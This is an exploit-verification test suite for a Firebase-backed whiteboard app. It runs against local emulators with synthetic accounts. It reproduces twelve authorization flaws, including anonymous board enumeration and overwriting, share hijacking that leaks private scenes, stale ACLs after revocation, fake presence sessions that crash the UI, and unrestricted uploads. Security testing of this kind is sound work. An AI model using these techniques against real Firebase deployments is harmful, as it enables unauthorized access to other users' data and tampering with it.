// Positive exploit-verification tests: PASS means the reported vulnerability reproduced.
// Only synthetic data in the hardcoded local demo project. No application fixes.
import assert from 'node:assert/strict'
import { createRequire } from 'node:module'
import { mkdir, readFile, writeFile } from 'node:fs/promises'
import { execFile } from 'node:child_process'
import { promisify } from 'node:util'
import puppeteer from 'puppeteer-core'
const wr = createRequire(new URL('../apps/whiteboard/package.json', import.meta.url))
const ar = createRequire(new URL('../functions/package.json', import.meta.url))
const fa = wr('firebase/app'), au = wr('firebase/auth'), fs = wr('firebase/firestore'), st = wr('firebase/storage')
const aa = ar('firebase-admin/app'), af = ar('firebase-admin/firestore'), ad = ar('firebase-admin/database')
const projectId = 'demo-whiteboard-security', base = 'http://127.0.0.1:15174'
const databaseNamespace = projectId
// The CLI loads RTDB rules into its default namespace, while Functions' demo
// database uses projectId. Install and verify the exact rules in that namespace.
const expectedRules = await readFile(new URL('../database.rules.json', import.meta.url), 'utf8')
const rulesUrl = `http://127.0.0.1:19000/.settings/rules.json?ns=${databaseNamespace}`
const installed = await fetch(rulesUrl, { method: 'PUT', headers: { Authorization: 'Bearer owner' }, body: expectedRules })
assert.equal(installed.status, 200, 'Must install repository RTDB rules before any exploit')
const loaded = await (await fetch(rulesUrl, { headers: { Authorization: 'Bearer owner' } })).json()
assert.deepEqual(loaded, JSON.parse(expectedRules), 'Emulator rules must equal repository rules')
Object.assign(process.env, {
  FIRESTORE_EMULATOR_HOST: '127.0.0.1:18080', FIREBASE_AUTH_EMULATOR_HOST: '127.0.0.1:19099',
  FIREBASE_DATABASE_EMULATOR_HOST: '127.0.0.1:19000', GCLOUD_PROJECT: projectId,
  FIREBASE_CONFIG: JSON.stringify({ projectId, databaseURL: `http://127.0.0.1:19000?ns=${databaseNamespace}` }),
  RTDB_FUNCTION_REGION: 'us-central1', FIRESTORE_FUNCTION_REGION: 'us-central1', SYNC_ACCESS_FUNCTION_REGION: 'us-central1',
})
const admin = aa.initializeApp({ projectId, databaseURL: `http://127.0.0.1:19000?ns=${databaseNamespace}` }, 'security-e2e')
const db = af.getFirestore(admin), rtdb = ad.getDatabase(admin)
const apps = [], results = [], prefix = `validation-${Date.now()}`
const out = new URL('../logs/security-e2e/', import.meta.url)
await mkdir(out, { recursive: true })
function client(name) {
  const app = fa.initializeApp({ projectId, apiKey: 'emulator-only', storageBucket: `${projectId}.appspot.com` }, `${prefix}-${name}`)
  apps.push(app)
  const auth = au.getAuth(app); au.connectAuthEmulator(auth, 'http://127.0.0.1:19099', { disableWarnings: true })
  const firestore = fs.getFirestore(app); fs.connectFirestoreEmulator(firestore, '127.0.0.1', 18080)
  const storage = st.getStorage(app); st.connectStorageEmulator(storage, '127.0.0.1', 19199)
  return { auth, db: firestore, storage }
}
const noAuth = client('no-auth'), attacker = client('attacker'), owner = client('owner'), editor = client('editor')
console.log('Security harness: repository RTDB rules verified; creating isolated identities')
const password = 'Synthetic-fixture-123!'
await au.signInAnonymously(attacker.auth)
await au.createUserWithEmailAndPassword(owner.auth, `${prefix}-owner@example.test`, password)
await au.createUserWithEmailAndPassword(editor.auth, `${prefix}-editor@example.test`, password)
const uid = owner.auth.currentUser.uid, attackerUid = attacker.auth.currentUser.uid, email = editor.auth.currentUser.email
const scene = (id) => ({ elements: [{ id, type: 'rectangle', x: 200, y: 200, width: 100, height: 80, angle: 0,
  strokeColor: '#000000', backgroundColor: 'transparent', fillStyle: 'solid', strokeWidth: 1, strokeStyle: 'solid',
  roughness: 1, opacity: 100, groupIds: [], frameId: null, roundness: null, seed: 1, version: 1,
  versionNonce: 100, isDeleted: false, boundElements: null, updated: 1, link: null, locked: false }], appState: {} })
const config = (id, access = 'restricted', role = 'viewer', extra = {}) => ({
  boardId: id, boardName: `Fixture ${id}`, ownerId: uid, ownerName: 'Fixture Owner', ownerEmail: owner.auth.currentUser.email,
  generalAccess: access, generalRole: role, invitedEmails: [], collaborators: {}, scene: scene(`${id}-secret`),
  createdAt: new Date().toISOString(), updatedAt: new Date().toISOString(), ...extra,
})
async function until(check, label, timeout = 20000) {
  const deadline = Date.now() + timeout
  while (Date.now() < deadline) { if (await check()) return; await new Promise(r => setTimeout(r, 100)) }
  throw new Error(`Timed out: ${label}`)
}
async function putShare(cfg) {
  await db.doc(`boardShares/${cfg.boardId}`).set(cfg)
  if (!cfg.invitedEmails.length) await until(async () => (await rtdb.ref(`boardAccess/${cfg.boardId}/ownerId`).get()).val() === cfg.ownerId, 'real trigger mirror')
}
async function rest(path, method = 'GET', body, user = attacker.auth.currentUser) {
  const token = user ? await user.getIdToken() : null
  const response = await fetch(`http://127.0.0.1:19000/${path}.json?ns=${databaseNamespace}${token ? `&auth=${encodeURIComponent(token)}` : ''}`, {
    method, ...(body === undefined ? {} : { body: JSON.stringify(body) }),
  })
  return { status: response.status, body: await response.json() }
}
const browser = await puppeteer.launch({ executablePath: process.env.CHROME_PATH || '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome', headless: true })
async function page() {
  const context = await browser.createBrowserContext(), p = await context.newPage()
  await p.setViewport({ width: 1440, height: 1000 })
  p.securityErrors = []
  p.on('pageerror', e => p.securityErrors.push(e.message))
  p.on('requestfailed', req => console.log(`BROWSER REQUEST FAILED: ${req.url()} ${req.failure()?.errorText}`))
  await p.setRequestInterception(true)
  p.on('request', req => {
    if (/googleapis.com|firebaseio.com|cloudfunctions.net/.test(new URL(req.url()).hostname)) {
      void req.abort('blockedbyclient')
    } else void req.continue()
  })
  await p.goto(base, { waitUntil: 'domcontentloaded' })
  await p.waitForFunction(() => Boolean(window.__security), { timeout: 30000 })
  return p
}
async function login(p, user = owner.auth.currentUser) {
  await p.evaluate(async ({ email, password }) => {
    const s = window.__security
    await s.auth.signInWithEmailAndPassword(s.firebase.getFirebaseAuth(), email, password)
    await s.workspace.workspaceApi.activateCloudWorkspace(s.firebase.getFirebaseAuth().currentUser.uid)
  }, { email: user.email, password })
}
async function openBoard(p, id) {
  await p.goto(`${base}/boards/${id}`, { waitUntil: 'domcontentloaded' })
  await p.waitForFunction(() => Boolean(window.__excalidrawAPI), { timeout: 30000 })
}
async function localBoard(p, name) {
  return p.evaluate(async ({ name, secret }) => {
    const api = window.__security.workspace.workspaceApi
    const project = await api.createProject(`${name} project`)
    const board = await api.createBoard(project.id, name)
    const saved = await api.saveBoard({ ...board, scene: secret })
    return { board: saved, project }
  }, { name, secret: scene(`${name}-private-secret`) })
}
async function run(id, name, body) {
  if (process.env.SECURITY_FINDINGS && !process.env.SECURITY_FINDINGS.split(',').includes(String(id))) return
  console.log(`RUNNING #${id}: ${name}`)
  const start = Date.now()
  try { const evidence = await body(); results.push({ id, name, verdict: 'REPRODUCED', durationMs: Date.now() - start, evidence }); console.log(`REPRODUCED #${id}: ${name}\n  ${JSON.stringify(evidence)}`) }
  catch (error) { results.push({ id, name, verdict: 'INCONCLUSIVE', durationMs: Date.now() - start, error: error.stack }); console.error(`INCONCLUSIVE #${id}: ${error.stack}`) }
  await writeFile(new URL('results.json', out), JSON.stringify({ projectId, started: prefix, results }, null, 2))
}
try {
  await run(1, 'Link board enumeration and anonymous editing', async () => {
    const view = `${prefix}-1-view`, edit = `${prefix}-1-edit`, priv = `${prefix}-1-private`
    await putShare(config(view, 'anyone_with_link')); await putShare(config(edit, 'anyone_with_link', 'editor')); await putShare(config(priv))
    const found = await fs.getDocs(fs.query(fs.collection(noAuth.db, 'boardShares'), fs.where('generalAccess', '==', 'anyone_with_link')))
    assert.ok(found.docs.some(d => d.id === view && d.data().ownerEmail === owner.auth.currentUser.email && d.data().scene.elements.length))
    await fs.updateDoc(fs.doc(noAuth.db, 'boardShares', edit), { boardName: 'Anonymous overwrite' })
    assert.equal((await db.doc(`boardShares/${edit}`).get()).data().boardName, 'Anonymous overwrite')
    await assert.rejects(fs.getDoc(fs.doc(noAuth.db, 'boardShares', priv)), /permission/i)
    await assert.rejects(fs.updateDoc(fs.doc(noAuth.db, 'boardShares', view), { boardName: 'denied' }), /permission/i)
    return { listedFixtureIds: found.docs.filter(d => d.id.startsWith(prefix)).map(d => d.id), anonymousWrite: true, restrictedAndViewerControls: 'denied' }
  })
  await run(2, 'Actual share UI removal retains editor access', async () => {
    const id = `${prefix}-2`, remaining = 'remaining@example.test'
    await putShare(config(id, 'restricted', 'viewer', { invitedEmails: [email, remaining], collaborators: {
      [email]: { email, role: 'editor', addedAt: new Date().toISOString() }, [remaining]: { email: remaining, role: 'viewer', addedAt: new Date().toISOString() },
    } }))
    const p = await page(); await login(p); await openBoard(p, id)
    await p.click('.header-share-btn')
    await p.waitForSelector('.google-share-user-row')
    // Locate the collaborator's role menu by visible email, then perform the real removal handler.
    const rows = await p.$$('.google-share-user-row')
    let roleButton
    for (const row of rows) {
      if (await row.evaluate((el, email) => el.textContent.includes(email), email)) {
        roleButton = await row.$('.google-share-role-trigger')
        break
      }
    }
    assert.ok(roleButton, 'Invited editor must appear in the share UI')
    await roleButton.click()
    await p.waitForSelector('.google-share-dropdown-danger'); await p.click('.google-share-dropdown-danger')
    await until(async () => !(await db.doc(`boardShares/${id}`).get()).data().invitedEmails.includes(email), 'UI removal committed')
    const persisted = (await db.doc(`boardShares/${id}`).get()).data()
    assert.equal(persisted.collaborators[email].role, 'editor')
    await assert.rejects(fs.getDoc(fs.doc(editor.db, 'boardShares', id)), /permission/i)
    await fs.updateDoc(fs.doc(editor.db, 'boardShares', id), { boardName: 'Removed editor overwrite' })
    await p.screenshot({ path: new URL('02-removal.png', out).pathname }); await p.browserContext().close()
    return { removedThroughUI: true, staleRole: persisted.collaborators[email].role, removedRead: 'denied', removedWrite: 'accepted' }
  })
  await run(3, 'Real callable mirror failure preserves public RTDB permissions', async () => {
    const id = `${prefix}-3`; await putShare(config(id, 'anyone_with_link', 'editor'))
    const p = await page(); await login(p)
    const error = await p.evaluate(async (cfg) => {
      try { await window.__security.sharing.sharingService.saveShareConfig(cfg); return null }
      catch (e) { return e.message }
    }, config(id, 'restricted', 'viewer', { invitedEmails: ['friend@example.test'] }))
    assert.ok(error, 'Real callable must fail')
    assert.equal((await db.doc(`boardShares/${id}`).get()).data().generalAccess, 'restricted')
    assert.equal((await rtdb.ref(`boardAccess/${id}/publicWrite`).get()).val(), true)
    const record = { id: 'outsider-element', version: 1, versionNonce: 1, lastModifiedBy: attackerUid, data: JSON.stringify(scene('outsider-element').elements[0]) }
    assert.equal((await rest(`boards/${id}/elements/outsider-element`, 'PUT', record)).status, 200)
    assert.equal((await rest(`boards/${id}/elements`)).status, 200)
    assert.equal((await rest(`boards/${id}/elements`, 'GET', undefined, null)).status, 401)
    await p.browserContext().close()
    return { callableError: error, firestore: 'restricted', stalePublicWrite: true, outsiderAnonymousAuthenticatedWrite: 200, trulyUnauthenticatedRead: 401 }
  })
  await run(4, 'Delayed historical event restores revoked ACL, including after deletion', async () => {
    const id = `${prefix}-4`, current = config(id); await putShare(current)
    const handlers = await import('../functions/lib/index.js')
    const event = value => ({ params: { boardId: id }, data: { after: { exists: Boolean(value), data: () => value } } })
    await handlers.mirrorBoardAccessToRtdb.run(event(current))
    await handlers.mirrorBoardAccessToRtdb.run(event(config(id, 'anyone_with_link', 'editor')))
    assert.equal((await rtdb.ref(`boardAccess/${id}/publicWrite`).get()).val(), true)
    assert.equal((await db.doc(`boardShares/${id}`).get()).data().generalAccess, 'restricted')
    const record = { id: 'e', version: 1, versionNonce: 1, lastModifiedBy: attackerUid, data: JSON.stringify(scene('e').elements[0]) }
    assert.equal((await rest(`boards/${id}/elements/e`, 'PUT', record)).status, 200)
    await db.doc(`boardShares/${id}`).delete()
    await until(async () => !(await rtdb.ref(`boardAccess/${id}`).get()).exists(), 'deletion trigger')
    await handlers.mirrorBoardAccessToRtdb.run(event(config(id, 'anyone_with_link', 'editor')))
    assert.equal((await rtdb.ref(`boardAccess/${id}/publicWrite`).get()).val(), true)
    return { historicalHandlerReplay: true, outsiderWriteAfterRevocation: 200, resurrectedAfterDeletion: true, limitation: 'Event ordering injected; real Eventarc reordering not induced' }
  })
  await run(5, 'Real logout/account switch exposes cached private scene and uploads pending board to B', async () => {
    const p = await page(); await login(p); const fixture = await localBoard(p, `${prefix}-5-A`)
    const cloudPath = `users/${uid}/projects/${fixture.project.id}/boards/${fixture.board.id}`
    await until(async () => (await db.doc(cloudPath).get()).exists(), 'A cloud sync')
    await putShare(config(fixture.board.id, 'restricted', 'viewer', { scene: fixture.board.scene }))
    const pending = await p.evaluate(async ({ projectId, scene }) => {
      const store = window.__security.workspace.workspaceStore
      const b = await store.createBoard(projectId, 'A unsynced private board')
      return await store.saveBoard({ ...b, scene })
    }, { projectId: fixture.project.id, scene: scene(`${prefix}-5-pending-secret`) })
    assert.equal((await db.doc(`users/${uid}/projects/${fixture.project.id}/boards/${pending.id}`).get()).exists, false)
    await p.evaluate(async () => { const s = window.__security; await s.auth.signOut(s.firebase.getFirebaseAuth()); s.workspace.workspaceApi.deactivateCloudWorkspace() })
    await openBoard(p, fixture.board.id)
    assert.ok(await p.evaluate(secret => window.__excalidrawAPI.getSceneElements().some(e => e.id === secret), `${prefix}-5-A-private-secret`))
    assert.notEqual(await p.evaluate(() => window.__security.firebase.getFirebaseAuth().currentUser?.uid), uid)
    await p.screenshot({ path: new URL('05-logged-out-private-scene.png', out).pathname })
    const b = client('account-B'); await au.createUserWithEmailAndPassword(b.auth, `${prefix}-B@example.test`, password)
    await login(p, b.auth.currentUser)
    const visible = await p.evaluate(async id => (await window.__security.workspace.workspaceApi.listWorkspace()).boards.some(b => b.id === id), fixture.board.id)
    assert.equal(visible, true)
    const copyPath = `users/${b.auth.currentUser.uid}/projects/${fixture.project.id}/boards/${pending.id}`
    await until(async () => (await db.doc(copyPath).get()).exists(), 'B cloud copy')
    assert.equal((await db.doc(copyPath).get()).data().scene.elements[0].id, `${prefix}-5-pending-secret`)
    await p.browserContext().close()
    return { loggedOutCanvasShowsASecret: true, accountBListsABoard: visible, pendingPrivateSceneCopiedIntoBNamespace: true }
  })
  await run(6, 'Known-ID share hijack leaks owner private scene after real canvas edit', async () => {
    const p = await page(); await login(p); const fixture = await localBoard(p, `${prefix}-6-owner`)
    await until(async () => (await db.doc(`users/${uid}/projects/${fixture.project.id}/boards/${fixture.board.id}`).get()).exists(), 'private board synced')
    assert.equal((await db.doc(`boardShares/${fixture.board.id}`).get()).exists, false)
    await fs.setDoc(fs.doc(attacker.db, 'boardShares', fixture.board.id), config(fixture.board.id, 'anyone_with_link', 'editor', { ownerId: attackerUid, scene: { elements: [], appState: {} } }))
    await openBoard(p, fixture.board.id)
    await p.waitForFunction(secret => window.__excalidrawAPI.getSceneElements().some(e => e.id === secret), {}, `${prefix}-6-owner-private-secret`)
    // Generate an actual user input/save through Excalidraw; do not call sharing sync directly.
    await p.keyboard.press('r'); await p.mouse.move(700, 500); await p.mouse.down(); await p.mouse.move(840, 600, { steps: 8 }); await p.mouse.up()
    await until(async () => (await fs.getDoc(fs.doc(attacker.db, 'boardShares', fixture.board.id))).data().scene.elements.some(e => e.id === `${prefix}-6-owner-private-secret`), 'attacker reads leaked private element')
    const leaked = (await fs.getDoc(fs.doc(attacker.db, 'boardShares', fixture.board.id))).data()
    assert.equal(leaked.ownerId, attackerUid)
    await assert.rejects(fs.getDoc(fs.doc(attacker.db, `users/${uid}/projects/${fixture.project.id}/boards/${fixture.board.id}`)), /permission/i)
    await p.screenshot({ path: new URL('06-hijacked-owner-canvas.png', out).pathname }); await p.browserContext().close()
    return { knownBoardIdRequired: true, attackerOwnsShare: true, ownerPrivateElementVisibleToAttackerAfterCanvasEdit: true, directPrivateNamespaceRead: 'denied' }
  })
  await run(7, 'Workspace deletion leaves shared scene readable in fresh browser', async () => {
    const p = await page(); await login(p); const fixture = await localBoard(p, `${prefix}-7-deleted`)
    await p.evaluate(async cfg => window.__security.sharing.sharingService.saveShareConfig(cfg), config(fixture.board.id, 'anyone_with_link', 'viewer', { scene: fixture.board.scene }))
    await p.evaluate(async id => window.__security.workspace.workspaceApi.deleteBoard(id), fixture.board.id)
    assert.equal(await p.evaluate(async id => window.__security.workspace.workspaceApi.loadBoard(id), fixture.board.id), null)
    await until(async () => (await db.doc(`users/${uid}/projects/${fixture.project.id}/boards/${fixture.board.id}`).get()).data()?.active === false, 'private deletion sync')
    const guest = await page(); await openBoard(guest, fixture.board.id)
    assert.ok(await guest.evaluate(secret => window.__excalidrawAPI.getSceneElements().some(e => e.id === secret), `${prefix}-7-deleted-private-secret`))
    assert.equal((await rtdb.ref(`boardAccess/${fixture.board.id}/publicRead`).get()).val(), true)
    await guest.screenshot({ path: new URL('07-deleted-link-still-opens.png', out).pathname })
    await p.browserContext().close(); await guest.browserContext().close()
    return { privateActive: false, sharedRecordSurvives: true, freshBrowserRendersDeletedScene: true, mirrorStillPublic: true }
  })
  await run(8, 'Unverified invited email obtains restricted read/write permissions', async () => {
    const id = `${prefix}-8`; assert.equal(editor.auth.currentUser.emailVerified, false)
    const claims = (await editor.auth.currentUser.getIdTokenResult()).claims; assert.equal(claims.email_verified, false)
    await putShare(config(id, 'restricted', 'viewer', { invitedEmails: [email], collaborators: { [email]: { email, role: 'editor' } } }))
    await fs.getDoc(fs.doc(editor.db, 'boardShares', id)); await fs.updateDoc(fs.doc(editor.db, 'boardShares', id), { boardName: 'Unverified overwrite' })
    await assert.rejects(fs.getDoc(fs.doc(attacker.db, 'boardShares', id)), /permission/i)
    return { emailVerified: claims.email_verified, restrictedReadAndWrite: 'accepted', unrelatedIdentityRead: 'denied', prerequisite: 'Provider allows registration of an unverified invited email; deployed provider settings not inspected' }
  })
  await run(9, 'One viewer forces owner into spectator mode and crashes presence UI', async () => {
    const id = `${prefix}-9`; await putShare(config(id, 'anyone_with_link', 'viewer'))
    await assert.rejects(fs.updateDoc(fs.doc(attacker.db, 'boardShares', id), { boardName: 'viewer denied' }), /permission/i)
    for (let i = 0; i < 11; i++) {
      const sid = `fake-${String(i).padStart(2, '0')}`
      assert.equal((await rest(`activeSessions/${id}/${sid}`, 'PUT', { userId: attackerUid, sessionId: sid, joinedAt: 0, lastSeen: Date.now() })).status, 200)
      assert.equal((await rest(`presence/${id}/${sid}`, 'PUT', { userId: attackerUid, sessionId: sid, joinedAt: 0, lastSeen: Date.now(), displayName: 'Fake viewer', color: '#000' })).status, 200)
    }
    const p = await page(); await login(p); await openBoard(p, id)
    await p.waitForSelector('.spectator-mode-banner', { timeout: 30000 })
    await p.waitForFunction(() => window.__excalidrawAPI.getAppState().viewModeEnabled === true)
    await p.screenshot({ path: new URL('09-owner-spectator.png', out).pathname })
    assert.equal((await rest(`presence/${id}/fake-00`, 'PUT', { userId: attackerUid, sessionId: 'fake-00', joinedAt: 0, lastSeen: Date.now(), displayName: { invalid: true }, color: '#000' })).status, 200)
    await until(async () => p.securityErrors.some(e => /startsWith|trim|replace.*function/.test(e)), 'real avatar renderer type exception')
    const errors = [...p.securityErrors]
    await p.screenshot({ path: new URL('09-presence-crash.png', out).pathname }); await p.browserContext().close()
    return { viewerSessionWrites: 11, ownerSpectatorBanner: true, ownerCanvasViewMode: true, rendererErrors: errors }
  })
  await run(10, 'Direct anonymous upload and malformed database payload bypass limits', async () => {
    const id = `${prefix}-10`; await putShare(config(id, 'anyone_with_link', 'editor'))
    const object = st.ref(noAuth.storage, `boards/${id}/snapshots/arbitrary.bin`)
    await st.uploadBytes(object, new Uint8Array(11 * 1024 * 1024), { contentType: 'application/octet-stream' })
    const metadata = await st.getMetadata(object); assert.equal(metadata.size, 11 * 1024 * 1024)
    await assert.rejects(st.uploadBytes(st.ref(noAuth.storage, `boards/${id}/assets/too-large.bin`), new Uint8Array(11 * 1024 * 1024)), /unauthorized/i)
    const payload = { id: 'outer', version: 'not-a-number', versionNonce: 1, lastModifiedBy: attackerUid, data: '{"id":"different","type":"invalid"}', extra: 'x'.repeat(300000) }
    assert.equal((await rest(`boards/${id}/elements/outer`, 'PUT', payload)).status, 200)
    assert.equal((await rest(`boards/${id}/elements/outer`)).body.extra.length, 300000)
    assert.equal((await rest(`boards/${id}/elements/outer`, 'PUT', { ...payload, data: 'x'.repeat(262145) })).status, 401)
    return { unauthenticatedSnapshotBytes: metadata.size, invalidVersionAccepted: true, mismatchedInnerIdAccepted: true, extraFieldBytes: 300000, assetsSizeAndDataLengthControls: 'denied', limitation: 'Bounded samples; no flood, quota exhaustion, or billing incident simulated' }
  })
  await run(11, 'Retained object download token bypasses later board revocation', async () => {
    const id = `${prefix}-11`; await putShare(config(id, 'anyone_with_link', 'editor'))
    const object = st.ref(noAuth.storage, `boards/${id}/assets/fixture.txt`), secret = `synthetic-secret-${prefix}`
    await st.uploadBytes(object, new TextEncoder().encode(secret), { contentType: 'text/plain' })
    const url = await st.getDownloadURL(object)
    await fs.updateDoc(fs.doc(owner.db, 'boardShares', id), { generalAccess: 'restricted' })
    await assert.rejects(st.getMetadata(object), /unauthorized/i)
    const response = await fetch(url); assert.equal(response.status, 200); assert.equal(await response.text(), secret)
    return { retainedUrlAnonymousHTTP: 200, downloadedExactFixture: true, postRevocationRuleCheckedMetadata: 'denied', prerequisite: 'Previously obtained durable token for an uploaded object' }
  })
  await run(12, 'Unpaired MCP adapter poisons canvas and forges command acknowledgement', async () => {
    const { stdout } = await promisify(execFile)(process.execPath, ['tests/security-mcp-repro.mjs'], { timeout: 30000, maxBuffer: 1024 * 1024 })
    assert.ok(stdout.includes('forge success ACK')); assert.ok(stdout.includes('after all adapters disconnect'))
    return { protocolOutput: stdout.trim().split('\n'), limitation: 'Real MCP server with synthetic adapters; remote reachability and hostile webpage local-network policy not asserted' }
  })
} finally {
  await browser.close()
  await Promise.all(apps.map(fa.deleteApp))
  await aa.deleteApp(admin)
  if (aa.getApps().some(a => a.name === '[DEFAULT]')) await aa.deleteApp(aa.getApp())
}
console.log(`\n${results.filter(r => r.verdict === 'REPRODUCED').length}/${results.length} findings reproduced. PASS denotes exploit present.`)
if (results.some(r => r.verdict !== 'REPRODUCED')) process.exitCode = 1
